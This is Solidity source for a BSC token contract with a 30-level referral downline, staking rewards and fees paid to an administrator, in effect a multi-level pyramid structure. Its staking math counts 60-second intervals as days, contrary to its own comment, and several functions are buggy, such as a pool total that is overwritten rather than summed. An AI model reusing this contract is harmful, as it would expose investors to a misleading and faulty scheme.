/**
 *Submitted for verification at BscScan.com on 2022-06-12
*/

pragma solidity ^0.5.17;

 /**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BEP20 {
 /*==============================
    =            EVENTS            =
    ==============================*/
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingBnb,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 bnbEarned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 bnbReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 bnbWithdrawn
    );
    
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
	event Approval(
	address indexed owner, 
	address indexed spender,
	uint value
	);
   

	function totalSupply() public view returns (uint256);
	function allowance(address owner, address spender)public view returns (uint);
    function transferFrom(address from, address to, uint value)public returns (bool ok);
    function approve(address spender, uint value)public returns (bool ok);
    function transfer(address to, uint value)public returns (bool ok);
}

contract newtoken is BEP20 {
    
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    
    string public name                                      = "newtoken";
    string public symbol                                    = "nwt";
    uint8 constant public decimals                          = 18;
  
    uint8 constant internal referralPer_                    = 10;
    uint8 constant internal developerPer_                    = 10;
   
    uint8 internal stakePer_                                = 1;
    uint256 constant internal tokenPriceInitial_            = 0.001 finney;
    uint256 constant internal tokenPriceIncremental_        = 0.0001 finney;
    uint256 constant internal tokenPriceDecremental_        = 0.0001 finney;
    uint256 constant internal magnitude                     = 2**64;
    
   
    uint256 public stakingRequirement                       = 1e18;

  
	uint256[] public POOL_PERCENTS 	= [2000, 1000, 500, 300, 200, 200, 200, 200, 200, 200, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 100, 100, 100, 100, 100, 100, 100, 500, 500, 2000];
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
    
    // Ambassador program
    mapping(address => bool) internal ambassadors_;
    uint256 constant internal ambassadorMaxPurchase_        = 1000 finney;
    uint256 constant internal ambassadorQuota_              = 1000 finney;
    
   /*================================
    =            DATASETS            =
    ================================*/
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    mapping(address => uint256) internal withdrawnstakeLedger_;
    mapping(address => uint256) internal withdrawnpoolLedger_;
    mapping(address => uint256) internal stakingTime_;
    mapping(address => uint256) internal startTime_;
    mapping(address => uint256) internal referralBalance_;
    
    mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;

    mapping(address => address) internal referralLevel11Address;
    mapping(address => address) internal referralLevel12Address;
    mapping(address => address) internal referralLevel13Address;
    mapping(address => address) internal referralLevel14Address;
    mapping(address => address) internal referralLevel15Address;
    mapping(address => address) internal referralLevel16Address;
    mapping(address => address) internal referralLevel17Address;
    mapping(address => address) internal referralLevel18Address;
    mapping(address => address) internal referralLevel19Address;
    mapping(address => address) internal referralLevel20Address;
	
	mapping(address => address) internal referralLevel21Address;
    mapping(address => address) internal referralLevel22Address;
    mapping(address => address) internal referralLevel23Address;
    mapping(address => address) internal referralLevel24Address;
    mapping(address => address) internal referralLevel25Address;
    mapping(address => address) internal referralLevel26Address;
    mapping(address => address) internal referralLevel27Address;
    mapping(address => address) internal referralLevel28Address;
    mapping(address => address) internal referralLevel29Address;
    mapping(address => address) internal referralLevel30Address;
    
    mapping(address => uint256) internal payoutsTo_;
    mapping(address => uint256) internal payouts_;
    mapping(address => uint256) internal ambassadorAccumulatedQuota_;
    uint256 internal tokenSupply_                           = 0;
    uint256 internal developerBalance                       = 0;
    uint256 internal profitPerShare_;
    mapping (address => uint256) balances;
     mapping(address => mapping(address => uint)) allowed;
    
  
    address payable public administrators;
    bool public onlyAmbassadors = false;
    
    /*=================================
    =            MODIFIERS            =
    =================================*/
    
     // Only people with tokens
    modifier onlybelievers () {
        require(myTokens() > 0);
        _;
    }
    
    // Only people with profits
    modifier onlyhodler() {
        require(myDividends(true) > 0);
        _;
    }
    
    // Only admin
    modifier onlyAdministrator(){
        require(administrators == msg.sender);
        _;
    }
    
    modifier antiEarlyWhale(uint256 _amountOfBnb){
        address _customerAddress = msg.sender;
        if( onlyAmbassadors && ((totalBnbBalance() - _amountOfBnb) <= ambassadorQuota_ )){
            require(
                // is the customer in the ambassador list?
                ambassadors_[_customerAddress] == true &&
                // does the customer purchase exceed the max ambassador quota?
                (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfBnb) <= ambassadorMaxPurchase_
            );
            // updated the accumulated quota    
            ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfBnb);
            _;
        } else {
            // in case the ether count drops low, the ambassador phase won't reinitiate
            onlyAmbassadors = false;
            _;    
        }
    }
    
   

    /*=======================================
    =            PUBLIC FUNCTIONS            =
    =======================================*/
    /*
    * -- APPLICATION ENTRY POINTS --  
    */
    constructor(address payable admin) public {
        // add administrators here
        administrators = admin;
        ambassadors_[address(0)] = true;
    }
     
    /**
     * BUY
     */
    function buy(address _referredBy) payable public {
        purchaseTokens(msg.value, _referredBy);
    }
    
        
    /**
     * REINVEST
     */
    /*function reinvest() onlyhodler() public {
        
        uint256 _dividends                  = myDividends(false); // retrieve ref. bonus later in the code
        
        address _customerAddress            = msg.sender;
        payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
        
        _dividends                          += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress]  = 0;
        
        uint256 _tokens                     = purchaseTokens(_dividends, address(0));
        // fire event
        emit onReinvestment(_customerAddress, _dividends, _tokens);
    }*/
    
    /**
     * EXIT
     */
    function exit() public {
        
        address _customerAddress            = msg.sender;
        uint256 _tokens                     = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
        withdraw();
    }

    /**
     * WITHDRAW
     */
    function withdraw() onlyhodler() public {
        
        address _customerAddress            = msg.sender;
		uint256 withdrawamt;
        
		withdrawamt = SafeMath.add(payouts_[_customerAddress],referralBalance_[_customerAddress]);

		payoutsTo_[_customerAddress] = withdrawamt;
		
        payouts_[_customerAddress] = 0;
        referralBalance_[_customerAddress]  = 0;

        uint256 contractBalance = address(this).balance;
        require(withdrawamt <= contractBalance);
				
        msg.sender.transfer(withdrawamt);
        // fire event
        emit onWithdraw(_customerAddress, withdrawamt);
    }
    
    /**
     * SELL
     */
    function sell(uint256 _amountOfTokens) onlybelievers () public {
        address _customerAddress            = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens                     = _amountOfTokens;
        uint256 _bnb                        = tokensToBnb_(_tokens);
        uint256 _taxedbnb                   = _bnb;
        
        tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        
        payouts_[_customerAddress]        += _taxedbnb;       
        
        emit onTokenSell(_customerAddress, _tokens, _taxedbnb);
    }
    
    /**
     * TRANSFER
     */
    function transfer(address _toAddress, uint256 _amountOfTokens) onlybelievers () public returns(bool) {
        address _customerAddress            = msg.sender;
        
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        
        uint256 _taxedTokens                = _amountOfTokens;
       
        tokenSupply_                        = tokenSupply_;
        
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress]     = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
       
       
        emit Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
    }
    
    /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
    
    function disableInitialStage() onlyAdministrator() public {
        onlyAmbassadors                     = false;
    }
    
    function changeStakePercent(uint8 stakePercent) onlyAdministrator() public {
        stakePer_                           = stakePercent;
    }
            
    function setStakingRequirement(uint256 _amountOfTokens) onlyAdministrator() public {
        stakingRequirement                  = _amountOfTokens;
    }
    
    
    
    /*---------- CALCULATORS  ----------*/
    
    function totalBnbBalance() public view returns(uint) {
        return address(this).balance;
    }
   
    function totalDeveloperBalance() public view returns(uint) {
        return developerBalance;
    }
    
    function totalSupply() public view returns(uint256) {
        return tokenSupply_;
    }
    
    
    function myTokens() public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return stakebalance(_customerAddress);
    }
    
    
    function myDividends(bool _includeReferralBonus) public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }
    
   
    function balanceOf(address _customerAddress) view public returns(uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }
    
     function dividendsOf(address _customerAddress) view public returns(uint256) {
        return payouts_[_customerAddress];
    }
    function totalPayouts(address _customerAddress) view public returns(uint256) {
        return payoutsTo_[_customerAddress];
    }
    
    
   
    
	 function transferFrom( address _from, address _to, uint256 _amount ) public returns (bool success) {
        require( _to != address(0));
        require(tokenBalanceLedger_[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount >= 0);
        tokenBalanceLedger_[_from] = SafeMath.sub(tokenBalanceLedger_[_from],_amount);
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender],_amount);
        tokenBalanceLedger_[_to] = SafeMath.add(tokenBalanceLedger_[_to],_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    
    // Allow _spender to withdraw from your account, multiple times, up to the _value amount.
    // If this function is called again it overwrites the current allowance with _value.
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require( _spender != address(0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
  
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require( _owner != address(0) && _spender !=address(0));
        return allowed[_owner][_spender];
    }
	
   
    function sellPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       - tokenPriceDecremental_;
        } else {
            uint256 _bnb               = tokensToBnb_(1e18);
            uint256 _taxedbnb          = _bnb;
            return _taxedbnb;
        }
    }
    
   
    function buyPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       + tokenPriceIncremental_;
        } else {
            uint256 _bnb               = tokensToBnb_(1e18);
            return _bnb;
        }
    }
   
    function calculateTokensReceived(uint256 _bnbToSpend) public view returns(uint256) {
       
        uint256 _amountOfTokens             = bnbToTokens_(_bnbToSpend);
        return _amountOfTokens;
    }
   
    function calculateBnbReceived(uint256 _tokensToSell) public view returns(uint256) {
        require(_tokensToSell <= tokenSupply_);
        uint256 _bnb                   = tokensToBnb_(_tokensToSell);
        uint256 _taxedbnb             = _bnb;
        return _taxedbnb;
    }
    
      
    
    function stakeprofit(address _customerAddress) public view returns(uint256){
        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
        uint256 dayscount                   = SafeMath.div(timediff, 60); //86400 Sec for 1 Day
        uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
        uint256 roiTokens                   = SafeMath.percent(stakeBalanceLedger_[_customerAddress],roiPercent,100,18);
        
        return roiTokens;
    }

    function poolprofit(address _customerAddress) public view returns(uint256){
        uint256 totalPoolAmount;

        for	(uint256 y=1; y<= referralCount_[_customerAddress]; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(_customerAddress, y);
		
			address downline = addressdownline;

            uint256 timediff                    = SafeMath.sub(now, startTime_[downline]);
            uint256 dayscount                   = SafeMath.div(timediff, 60); //86400 Sec for 1 Day
            uint256 roiPercent                  = SafeMath.mul(dayscount, SafeMath.div(POOL_PERCENTS[level-1],PERCENTS_DIVIDER));
            totalPoolAmount                     = SafeMath.percent(stakeBalanceLedger_[downline],roiPercent,100,18);
        }
        
        
        return totalPoolAmount;
    }

    function poolTokensremaining(address _customerAddress) public view returns(uint256){
            return SafeMath.sub(poolprofit(_customerAddress),withdrawnpoolLedger_[_customerAddress]);
    }

    function startTime(address _customerAddress) public view returns(uint256){
        return startTime_[_customerAddress];
    }

    function stakeTokensTime(address _customerAddress) public view returns(uint256){
        return stakingTime_[_customerAddress];
    }

    function stakebalance(address _customerAddress) public view returns(uint256){
        return stakeBalanceLedger_[_customerAddress];
    }

    function stakeprofitwithdraw(address _customerAddress) public view returns(uint256){
        return withdrawnstakeLedger_[_customerAddress];
    }

    function poolprofitwithdraw(address _customerAddress) public view returns(uint256){
        return withdrawnpoolLedger_[_customerAddress];
    }
    
    function withdrawstakeprofit() onlybelievers () public returns(bool){
        address _customerAddress            = msg.sender;
    
        require(!onlyAmbassadors && stakingTime_[_customerAddress] > 0);
       
        uint256 roiTokens                   = stakeprofit(_customerAddress);
        uint256 poolTokens                  = poolTokensremaining(_customerAddress);

        uint256 Totalwithdrawtoken = SafeMath.add(roiTokens,poolTokens);
             
        
        tokenSupply_                        = SafeMath.add(tokenSupply_, Totalwithdrawtoken);
    
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], roiTokens);
        withdrawnstakeLedger_[_customerAddress] = SafeMath.add(withdrawnstakeLedger_[_customerAddress],roiTokens);
        withdrawnpoolLedger_[_customerAddress] = SafeMath.add(withdrawnpoolLedger_[_customerAddress],poolTokens);

        stakingTime_[_customerAddress] = now;
        
    }
    
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    
    uint256 developerFee;
    uint256 incBNB;
    address _refAddress; 
    uint256 _referralBonus;
    
    
    uint256 bonusLv1;
    uint256 bonusLv2;
    uint256 bonusLv3;
    
    
    address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
    
	address chkLv11;
	address chkLv12;
    address chkLv13;
    address chkLv14;
    address chkLv15;
    address chkLv16;
    address chkLv17;
    address chkLv18;
    address chkLv19;
    address chkLv20;
	
	address chkLv21;
	address chkLv22;
    address chkLv23;
    address chkLv24;
    address chkLv25;
    address chkLv26;
    address chkLv27;
    address chkLv28;
    address chkLv29;
    address chkLv30;
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
    function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    function getref(address _customerAddress, uint _level) public view returns(address lv) {
        if(_level == 1) {
            lv = referralLevel1Address[_customerAddress];
        } else if(_level == 2) {
            lv = referralLevel2Address[_customerAddress];
        } else if(_level == 3) {
            lv = referralLevel3Address[_customerAddress];
        } 
        return lv;
    }
    
    function distributeRefBonus(uint256 _incomingbnb, address _referredBy, address _sender, bool _newReferral) internal {
        address _customerAddress        = _sender;
        uint256 remainingRefBonus       = _incomingbnb;
        _referralBonus                  = _incomingbnb;
        
        bonusLv1                        = SafeMath.percent(_referralBonus,5,100,18);
        bonusLv2                        = SafeMath.percent(_referralBonus,3,100,18);
        bonusLv3                        = SafeMath.percent(_referralBonus,2,100,18);
      
        
      
        referralLevel1Address[_customerAddress]                     = _referredBy;
        referralBalance_[referralLevel1Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel1Address[_customerAddress]], bonusLv1);
        remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv1);
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];

        chkLv11                          = referralLevel10Address[_referredBy];
	    chkLv12                          = referralLevel11Address[_referredBy];
        chkLv13                          = referralLevel12Address[_referredBy];
        chkLv14                          = referralLevel13Address[_referredBy];
        chkLv15                          = referralLevel14Address[_referredBy];
        chkLv16                          = referralLevel15Address[_referredBy];
        chkLv17                          = referralLevel16Address[_referredBy];
        chkLv18                          = referralLevel17Address[_referredBy];
        chkLv19                          = referralLevel18Address[_referredBy];
        chkLv20                          = referralLevel19Address[_referredBy];
		
	    chkLv21                          = referralLevel20Address[_referredBy];
	    chkLv22                          = referralLevel21Address[_referredBy];
        chkLv23                          = referralLevel22Address[_referredBy];
        chkLv24                          = referralLevel23Address[_referredBy];
        chkLv25                          = referralLevel24Address[_referredBy];
        chkLv26                          = referralLevel25Address[_referredBy];
        chkLv27                          = referralLevel26Address[_referredBy];
        chkLv28                          = referralLevel27Address[_referredBy];
        chkLv29                          = referralLevel28Address[_referredBy];
        chkLv30                          = referralLevel29Address[_referredBy];
		
        
      
        if(chkLv2 != address(0)) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            referralBalance_[referralLevel2Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel2Address[_customerAddress]], bonusLv2);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv2);
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
      
        if(chkLv3 != address(0)) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            referralBalance_[referralLevel3Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel3Address[_customerAddress]], bonusLv3);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv3);
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
      
        if(chkLv4 != address(0)) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
      
        if(chkLv5 != address(0)) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
      
        if(chkLv6 != address(0)) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        
        if(chkLv7 != address(0)) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        
        if(chkLv8 != address(0)) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        
        if(chkLv9 != address(0)) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
       
        if(chkLv10 != address(0)) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }

        // Level 11
        if(chkLv11 != address(0)) {
            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11);
            }
        }
		
		 // Level 12
        if(chkLv12 != address(0)) {
            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12);
            }
        }
		
		 // Level 13
        if(chkLv13 != address(0)) {
            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13);
            }
        }
		
		 // Level 14
        if(chkLv14 != address(0)) {
            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14);
            }
        }
		
		 // Level 15
        if(chkLv15 != address(0)) {
            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15);
            }
        }
		
		 // Level 16
        if(chkLv16 != address(0)) {
            referralLevel16Address[_customerAddress]                    = referralLevel15Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel15Address[_referredBy], _customerAddress, 16);
            }
        }
		
		// Level 17
        if(chkLv17 != address(0)) {
            referralLevel17Address[_customerAddress]                    = referralLevel16Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel16Address[_referredBy], _customerAddress, 17);
            }
        }
		
		// Level 18
        if(chkLv18 != address(0)) {
            referralLevel18Address[_customerAddress]                    = referralLevel17Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel17Address[_referredBy], _customerAddress, 18);
            }
        }
		
		// Level 19
        if(chkLv19 != address(0)) {
            referralLevel19Address[_customerAddress]                    = referralLevel18Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel18Address[_referredBy], _customerAddress, 19);
            }
        }
		
		// Level 20
        if(chkLv20 != address(0)) {
            referralLevel20Address[_customerAddress]                    = referralLevel19Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel19Address[_referredBy], _customerAddress, 20);
            }
        }
		
		// Level 21
		if(chkLv21 != address(0)) {
			referralLevel21Address[_customerAddress]                    = referralLevel20Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel20Address[_referredBy], _customerAddress, 21);
			}
		}

		// Level 22
		if(chkLv22 != address(0)) {
			referralLevel22Address[_customerAddress]                    = referralLevel21Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel21Address[_referredBy], _customerAddress, 22);
			}
		}

		// Level 23
		if(chkLv23 != address(0)) {
			referralLevel23Address[_customerAddress]                    = referralLevel22Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel22Address[_referredBy], _customerAddress, 23);
			}
		}

		// Level 24
		if(chkLv24 != address(0)) {
			referralLevel24Address[_customerAddress]                    = referralLevel23Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel23Address[_referredBy], _customerAddress, 24);
			}
		}

		// Level 25
		if(chkLv25 != address(0)) {
			referralLevel25Address[_customerAddress]                    = referralLevel24Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel24Address[_referredBy], _customerAddress, 25);
			}
		}

		// Level 26
		if(chkLv26 != address(0)) {
			referralLevel26Address[_customerAddress]                    = referralLevel25Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel25Address[_referredBy], _customerAddress, 26);
			}
		}

		// Level 27
		if(chkLv27 != address(0)) {
			referralLevel27Address[_customerAddress]                    = referralLevel26Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel26Address[_referredBy], _customerAddress, 27);
			}
		}

		// Level 28
		if(chkLv28 != address(0)) {
			referralLevel28Address[_customerAddress]                    = referralLevel27Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel27Address[_referredBy], _customerAddress, 28);
			}
		}

		// Level 29
		if(chkLv29 != address(0)) {
			referralLevel29Address[_customerAddress]                    = referralLevel28Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel28Address[_referredBy], _customerAddress, 29);
			}
		}

		// Level 30
		if(chkLv30 != address(0)) {
			referralLevel30Address[_customerAddress]                    = referralLevel29Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel29Address[_referredBy], _customerAddress, 30);
			}
		}

        administrators.transfer(remainingRefBonus);
        //developerBalance                    = SafeMath.add(developerBalance, remainingRefBonus);
    }

    function purchaseTokens(uint256 _incomingBnb, address _referredBy) antiEarlyWhale(_incomingBnb) internal returns(uint256) {
        
        address _customerAddress            = msg.sender;
        incBNB                              = _incomingBnb;
       
         _referralBonus                      = SafeMath.percent(incBNB,referralPer_,100,18);

         developerFee                      = SafeMath.percent(incBNB,developerPer_,100,18);
       
       
        uint256 _amountOfTokens             = bnbToTokens_(incBNB);

        bool    _newReferral                = true;
        if(referralLevel1Address[_customerAddress] != address(0)) {
            _referredBy                     = referralLevel1Address[_customerAddress];
            _newReferral                    = false;
        }
        
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        
        if(
           
            _referredBy != address(0) &&
           
            _referredBy != _customerAddress &&
            tokenBalanceLedger_[_referredBy] >= stakingRequirement
        ){
            
            distributeRefBonus(_referralBonus,_referredBy,_customerAddress,_newReferral);
        } else {
           
            developerBalance                = SafeMath.add(developerBalance, _referralBonus);
        }
       
        if(tokenSupply_ > 0){
           
            tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
           
        } else {
            
            tokenSupply_                    = _amountOfTokens;
        }
        
        
        stakingTime_[msg.sender]      = now;
        startTime_[msg.sender]        = now;

        stakeBalanceLedger_[msg.sender] = SafeMath.add(stakeBalanceLedger_[_customerAddress], _amountOfTokens);
       
        administrators.transfer(developerFee);
        emit onTokenPurchase(_customerAddress, incBNB, _amountOfTokens, _referredBy);
        return _amountOfTokens;
    }

   
    function bnbToTokens_(uint256 _bnb) internal view returns(uint256) {
        uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived             = 
         (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_bnb * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_)
        ;

        return _tokensReceived;
    }
    
    
     function tokensToBnb_(uint256 _tokens) internal view returns(uint256) {
        uint256 tokens_                     = (_tokens + 1e18);
        uint256 _tokenSupply                = (tokenSupply_ + 1e18);
        uint256 _etherReceived              =
        (
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/1e18))
                        )-tokenPriceDecremental_
                    )*(tokens_ - 1e18)
                ),(tokenPriceDecremental_*((tokens_**2-tokens_)/1e18))/2
            )
        /1e18);
        return _etherReceived;
    }
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
}